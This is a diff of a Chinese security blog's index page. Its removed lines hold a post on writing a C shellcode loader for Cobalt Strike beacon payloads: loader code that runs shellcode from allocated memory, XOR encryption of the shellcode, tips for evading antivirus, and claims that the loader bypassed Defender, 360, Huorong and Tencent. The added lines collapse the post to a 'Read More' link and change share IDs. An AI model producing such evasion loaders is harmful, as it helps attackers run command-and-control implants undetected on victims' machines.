@@ -94,56 +94,15 @@
     <div class="e-content article-entry" itemprop="articleBody">
       
         <h1 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h1><p>之前github找了一个基于go的loader，生成后文件大小6M多，而且细节不够了解，一旦被杀，都不知道改哪里，想来还是要自己写一个loader</p>
-<h1 id="0x02-免杀效果"><a href="#0x02-免杀效果" class="headerlink" title="0x02 免杀效果"></a>0x02 免杀效果</h1><p>文件大小12KB</p>
-<p><img src="/2022/11/01/%E5%A6%82%E4%BD%95%E7%94%A8C%E8%AF%AD%E8%A8%80%E5%AE%9E%E7%8E%B0%E8%87%AA%E5%B7%B1%E7%9A%84Shellcode-Loader/image-20221101150620575.png" alt="image-20221101150620575"></p>
-<p>虚拟机Win10：Defender（测试时间2022/10/31）</p>
-<p><img src="/2022/11/01/%E5%A6%82%E4%BD%95%E7%94%A8C%E8%AF%AD%E8%A8%80%E5%AE%9E%E7%8E%B0%E8%87%AA%E5%B7%B1%E7%9A%84Shellcode-Loader/image-20221031112509768.png" alt="image-20221031112509768"></p>
-<p>物理机Win10：360安全卫士（开核晶）、360杀毒、火绒、腾讯管家（测试时间2022/10/31）</p>
-<p><img src="/2022/11/01/%E5%A6%82%E4%BD%95%E7%94%A8C%E8%AF%AD%E8%A8%80%E5%AE%9E%E7%8E%B0%E8%87%AA%E5%B7%B1%E7%9A%84Shellcode-Loader/image-20221031113841499.png" alt="image-20221031113841499"></p>
-<p><img src="/2022/11/01/%E5%A6%82%E4%BD%95%E7%94%A8C%E8%AF%AD%E8%A8%80%E5%AE%9E%E7%8E%B0%E8%87%AA%E5%B7%B1%E7%9A%84Shellcode-Loader/image-20221031113643847.png" alt="image-20221031113643847"></p>
-<h1 id="0x02-Loader前世"><a href="#0x02-Loader前世" class="headerlink" title="0x02 Loader前世"></a>0x02 Loader前世</h1><p>编写shellcode loader，网上的文章很多了，但或多或少都会有点问题，比如这篇文章：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/oVGWlkv9amgGS5abzNEpdg%EF%BC%8C%E4%BB%96%E7%94%A8%E7%9A%84shellcode%E6%98%AFmsf%E7%94%9F%E6%88%90%E7%9A%84%EF%BC%8C%E5%BD%93%E4%BD%A0%E6%8D%A2%E6%88%90cs%E7%9A%84shellcode%E6%97%B6%EF%BC%8C%E4%BD%A0%E4%BC%9A%E5%8F%91%E7%8E%B0%EF%BC%8Cvs%E7%BC%96%E8%AF%91%E5%99%A8%E6%8A%A5%E9%94%99%E2%80%9C%E7%BC%96%E8%AF%91%E5%99%A8%E9%94%99%E8%AF%AF">https://mp.weixin.qq.com/s/oVGWlkv9amgGS5abzNEpdg，他用的shellcode是msf生成的，当你换成cs的shellcode时，你会发现，vs编译器报错“编译器错误</a> C2026”</p>
-<p>参考：<a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/cpp/error-messages/compiler-errors-1/compiler-error-c2026?view=msvc-170">https://learn.microsoft.com/zh-cn/cpp/error-messages/compiler-errors-1/compiler-error-c2026?view=msvc-170</a></p>
-<p>这个错误简单说，就是vs编译器规定，单个变量的字符串长度不能超过16380 个字节，而cs导出的stageless、x64的shellcode多达263168字节，大于16380字节，所以会报错，直接用网上文章的代码不行，我们就要学习下细节了</p>
-<h1 id="0x03-Loader今生"><a href="#0x03-Loader今生" class="headerlink" title="0x03 Loader今生"></a>0x03 Loader今生</h1><p>一个最简单的shellcode loader</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">int main()&#123;</span><br><span class="line">    unsigned char buf[] = &quot;shellcode&quot;;</span><br><span class="line">    void* exec = VirtualAlloc(0, sizeof buf, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    memcpy(exec, buf, sizeof buf);</span><br><span class="line">    ((void(*)())exec)();</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>shellcode存放于变量 -&gt; 内存申请 -&gt; 内存拷贝 -&gt; 内存执行</p>
-<p>由于cs导出的stageless、x64的shellcode多达263168字节，不能存到变量，所以我们选择从文件中读取，可使用文件打开函数fopen</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FILE *fp = fopen(&quot;beacon-stageless-x64.bin&quot;, &quot;rb&quot;)</span><br></pre></td></tr></table></figure>
-
-<p>申请内存空间，可使用函数malloc、new、VirtualAlloc、HeapAlloc、GlobalAlloc、LocalAlloc、CoTaskMemAlloc</p>
-<p>参考：<a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/windows/win32/memory/comparing-memory-allocation-methods">https://learn.microsoft.com/zh-cn/windows/win32/memory/comparing-memory-allocation-methods</a></p>
-<p>其中new是c++中用来申请内存的，VirtualAlloc用的较多，被杀软拦截的可能性较大，后面几个不是很常用，此处我们选择malloc</p>
-<p>需要注意，malloc是c语言标准库，意味着可跨平台，VirtualAlloc是windows api，算是windows平台下c语言运行时库，要想写跨平台的loader，需要用c语言标准库</p>
-<p>参数为shellcode大小，并将其返回值类型强制转换为char *</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">char *p = (char *) malloc(sizeof(buf));</span><br></pre></td></tr></table></figure>
-
-<p>拷贝shellcode到内存空间，可使用函数memcpy、fread、strcpy，此处我们选择fread</p>
-<p>第1个参数p为内存地址，通常为数组或指针，第2个参数表示每个数据块的字节数，第3个参数表示要读取的数据块的块数，第4个参数表示文件指针</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fread(p, sizeof(buf), 1, fp); </span><br></pre></td></tr></table></figure>
-
-<p>调用申请的内存空间首地址加载shellcode</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">((char(*)())p)();</span><br></pre></td></tr></table></figure>
-
-<p>最后这行代码看着有点复杂，但其实不难，我们看下面这个例子</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">void hello() &#123;</span><br><span class="line">      printf(&quot;hello world&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">    hello();  // 简化调用</span><br><span class="line">    (*hello)();  // 标准调用</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">hello()的标准调用方式是(*hello)()，也就是取这个函数的地址再调用，那么同理，void (*hello)()也可以理解为标准声明方式</span><br><span class="line">对于void (*hello)()这种函数声明，它的类型为void(*)()，也就是说，如果想要将某个函数强制转换为此类型应为(void(*)()) hello()</span><br><span class="line">回到( (char(*)()) p)()也就是将p强制转换为类型char(*)()后，再作为函数调用</span><br></pre></td></tr></table></figure>
-
-<p>上面只是讲了shellcode loader的基本步骤，实际编写的时候出于免杀效果好的考虑，可做如下操作：</p>
-<p>01、可在申请内存空间的时候去掉可执行属性，后面再对申请的内存空间设置可执行属性</p>
-<p>02、添加一些干扰代码，如调用memset对申请的内存空间全部置0</p>
-<p>03、改用其他函数实现对应功能</p>
-<p>04、还可以通过动态调用函数实现对应功能，可参考这篇文章：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzI0NzEwOTM0MA==&amp;mid=2652477998&amp;idx=1&amp;sn=21dd0456161ef1f38835b05e8da531e8&amp;chksm=f258399dc52fb08beb906630b4591b12c0db7058ddadce894e9f78626e2bae45c5690a3150ee&amp;scene=178&amp;cur_album_id=1430891819562549250#rd">https://mp.weixin.qq.com/s?__biz=MzI0NzEwOTM0MA==&amp;mid=2652477998&amp;idx=1&amp;sn=21dd0456161ef1f38835b05e8da531e8&amp;chksm=f258399dc52fb08beb906630b4591b12c0db7058ddadce894e9f78626e2bae45c5690a3150ee&amp;scene=178&amp;cur_album_id=1430891819562549250#rd</a></p>
-<h1 id="0x04-Shellcode加密"><a href="#0x04-Shellcode加密" class="headerlink" title="0x04 Shellcode加密"></a>0x04 Shellcode加密</h1><p>上面是loader的讲解，shellcode其实也需要加密，不然会被杀软直接杀掉</p>
-<p>shellcode加密相对好做，我这边测试，简单的异或加密，即可过掉大部分杀软，下面贴一下加密功能的代码，代码讲解基本和上述一样</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">int getFileSize(char* path) &#123;</span><br><span class="line">    FILE* fp = fopen(path, &quot;rt&quot;);</span><br><span class="line">    if (fp == NULL) &#123;</span><br><span class="line">        return -1;</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        fseek(fp, 0, SEEK_END);</span><br><span class="line">        int length = ftell(fp);</span><br><span class="line">        return length;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void Encrypt(char* oldpath, char* newpath) &#123;</span><br><span class="line">    FILE *fpr, *fpw;</span><br><span class="line">    fpr = fopen(oldpath, &quot;rb&quot;);</span><br><span class="line">    fpw = fopen(newpath, &quot;wb&quot;);</span><br><span class="line">    if (fpr == NULL || fpw == NULL) &#123;</span><br><span class="line">        return -1;</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        int length = getFileSize(oldpath);</span><br><span class="line">        char* p = (char*) malloc(length * sizeof(char));</span><br><span class="line">        fread(p, sizeof(char), length, fpr);</span><br><span class="line">        for (int i = 0; i &lt; length; i++) &#123;</span><br><span class="line">            p[i] ^= &#x27;A&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">        fwrite(p, sizeof(char), length, fpw);</span><br><span class="line">        fclose(fpr);</span><br><span class="line">        fclose(fpw);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>解密的时候，同样进行一下异或即可</p>
-<p>其实还有很多其他的变形异或加密方式，可参考这篇文章：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzI0NzEwOTM0MA==&amp;mid=2652477986&amp;idx=1&amp;sn=e1d5f269d5e9799aee007ee04df10b50&amp;chksm=f2583991c52fb0871508211416ff1a129206082f0bfdb72692ba33ad7fc9fb206e2445649b80&amp;scene=178&amp;cur_album_id=1430891819562549250#rd">https://mp.weixin.qq.com/s?__biz=MzI0NzEwOTM0MA==&amp;mid=2652477986&amp;idx=1&amp;sn=e1d5f269d5e9799aee007ee04df10b50&amp;chksm=f2583991c52fb0871508211416ff1a129206082f0bfdb72692ba33ad7fc9fb206e2445649b80&amp;scene=178&amp;cur_album_id=1430891819562549250#rd</a></p>
-
+        
+          <p class="article-more-link">
+            <a href="/2022/11/01/%E5%A6%82%E4%BD%95%E7%94%A8C%E8%AF%AD%E8%A8%80%E5%AE%9E%E7%8E%B0%E8%87%AA%E5%B7%B1%E7%9A%84Shellcode-Loader/#more">Read More</a>
+          </p>
+        
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/11/01/%E5%A6%82%E4%BD%95%E7%94%A8C%E8%AF%AD%E8%A8%80%E5%AE%9E%E7%8E%B0%E8%87%AA%E5%B7%B1%E7%9A%84Shellcode-Loader/" data-id="cl9y78ypx000kbzfydyqhg6qm" data-title="如何用C语言实现自己的Shellcode Loader" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2022/11/01/%E5%A6%82%E4%BD%95%E7%94%A8C%E8%AF%AD%E8%A8%80%E5%AE%9E%E7%8E%B0%E8%87%AA%E5%B7%B1%E7%9A%84Shellcode-Loader/" data-id="cl9y7u426000kizfy4mk59t9p" data-title="如何用C语言实现自己的Shellcode Loader" class="article-share-link">Share</a>
       
       
       
@@ -191,7 +150,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/11/01/CobaltStrike%E6%9C%8D%E5%8A%A1%E7%AB%AF%E9%85%8D%E7%BD%AE%E5%8F%8A%E4%B8%8A%E7%BA%BF%E5%BE%AE%E4%BF%A1%E6%8F%90%E9%86%92/" data-id="cl9y78ypq0003bzfybozlgyiz" data-title="CobaltStrike服务端配置及上线微信提醒" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2022/11/01/CobaltStrike%E6%9C%8D%E5%8A%A1%E7%AB%AF%E9%85%8D%E7%BD%AE%E5%8F%8A%E4%B8%8A%E7%BA%BF%E5%BE%AE%E4%BF%A1%E6%8F%90%E9%86%92/" data-id="cl9y7u4200003izfybu05gaso" data-title="CobaltStrike服务端配置及上线微信提醒" class="article-share-link">Share</a>
       
       
       
@@ -240,7 +199,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/10/24/ThinkPHP%E6%9C%80%E6%96%B0%E7%89%886-0-13-0day%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/" data-id="cl9y78ypr0005bzfybll5f1zw" data-title="ThinkPHP最新版6.0.13 0day利用链分析" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2022/10/24/ThinkPHP%E6%9C%80%E6%96%B0%E7%89%886-0-13-0day%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/" data-id="cl9y7u4210005izfyg4ln85m7" data-title="ThinkPHP最新版6.0.13 0day利用链分析" class="article-share-link">Share</a>
       
       
       
@@ -285,7 +244,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/07/09/APISIX-Dashboard-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%EF%BC%88CVE-2021-45232%EF%BC%89/" data-id="cl9y78ypk0000bzfy9jtkdulg" data-title="Apache APISIX Dashboard 未授权访问漏洞分析（CVE-2021-45232）" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2022/07/09/APISIX-Dashboard-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%EF%BC%88CVE-2021-45232%EF%BC%89/" data-id="cl9y7u41u0000izfyb3pg00ev" data-title="Apache APISIX Dashboard 未授权访问漏洞分析（CVE-2021-45232）" class="article-share-link">Share</a>
       
       
       
@@ -330,7 +289,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/07/09/Redis-RCE%E5%A4%8D%E7%8E%B0%E5%8F%8A%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90%EF%BC%88CVE-2022-0543%EF%BC%89/" data-id="cl9y78ypq0004bzfy1zvv8imf" data-title="Redis RCE复现及简单分析（CVE-2022-0543）" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2022/07/09/Redis-RCE%E5%A4%8D%E7%8E%B0%E5%8F%8A%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90%EF%BC%88CVE-2022-0543%EF%BC%89/" data-id="cl9y7u4210004izfyg3q876zu" data-title="Redis RCE复现及简单分析（CVE-2022-0543）" class="article-share-link">Share</a>
       
       
       
@@ -375,7 +334,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/04/28/%E9%80%9A%E8%BE%BEOA%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/" data-id="cl9y78yq0000ubzfy3qp3a8uw" data-title="通达OA漏洞研究" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2022/04/28/%E9%80%9A%E8%BE%BEOA%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/" data-id="cl9y7u428000rizfy16lneoss" data-title="通达OA漏洞研究" class="article-share-link">Share</a>
       
       
       
@@ -420,7 +379,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/04/18/Windows-Server-2012%E5%8F%8A%E4%BB%A5%E4%B8%8A%E4%B8%8D%E6%8F%90%E5%8F%96%E5%AF%86%E7%A0%81%E7%99%BB%E5%BD%95Administrator%E6%A1%8C%E9%9D%A2/" data-id="cl9y78ypv000ebzfy3v8yfkom" data-title="Windows Server 2012及以上不提取密码登录Administrator桌面" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2022/04/18/Windows-Server-2012%E5%8F%8A%E4%BB%A5%E4%B8%8A%E4%B8%8D%E6%8F%90%E5%8F%96%E5%AF%86%E7%A0%81%E7%99%BB%E5%BD%95Administrator%E6%A1%8C%E9%9D%A2/" data-id="cl9y7u4230008izfyflik7lmb" data-title="Windows Server 2012及以上不提取密码登录Administrator桌面" class="article-share-link">Share</a>
       
       
       
@@ -467,7 +426,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/03/22/%E7%88%86%E7%A0%B4%E5%B8%A6%E6%9C%89%E9%AA%8C%E8%AF%81%E7%A0%81%E7%9A%84Web%E7%99%BB%E5%BD%95%E8%A1%A8%E5%8D%95/" data-id="cl9y78ypz000qbzfycodf2d5d" data-title="爆破带有验证码的Web登录表单" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2022/03/22/%E7%88%86%E7%A0%B4%E5%B8%A6%E6%9C%89%E9%AA%8C%E8%AF%81%E7%A0%81%E7%9A%84Web%E7%99%BB%E5%BD%95%E8%A1%A8%E5%8D%95/" data-id="cl9y7u427000mizfy5qmahsm9" data-title="爆破带有验证码的Web登录表单" class="article-share-link">Share</a>
       
       
       
@@ -514,7 +473,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/03/22/%E5%9F%BA%E4%BA%8EphpStudy+PhpStorm%E9%85%8D%E7%BD%AEPHP%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83/" data-id="cl9y78ypw000ibzfyd2o278hz" data-title="基于phpStudy+PhpStorm配置PHP动态调试环境" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2022/03/22/%E5%9F%BA%E4%BA%8EphpStudy+PhpStorm%E9%85%8D%E7%BD%AEPHP%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83/" data-id="cl9y7u425000fizfy6cff6pxn" data-title="基于phpStudy+PhpStorm配置PHP动态调试环境" class="article-share-link">Share</a>
       
       
       
@@ -559,7 +518,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/03/02/Citrix-XenMobile%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%EF%BC%88CVE-2020-8209%EF%BC%89/" data-id="cl9y78ypn0001bzfyd11t67f3" data-title="Citrix XenMobile目录遍历漏洞分析（CVE-2020-8209）" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2022/03/02/Citrix-XenMobile%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%EF%BC%88CVE-2020-8209%EF%BC%89/" data-id="cl9y7u41y0001izfygusu7141" data-title="Citrix XenMobile目录遍历漏洞分析（CVE-2020-8209）" class="article-share-link">Share</a>
       
       
       
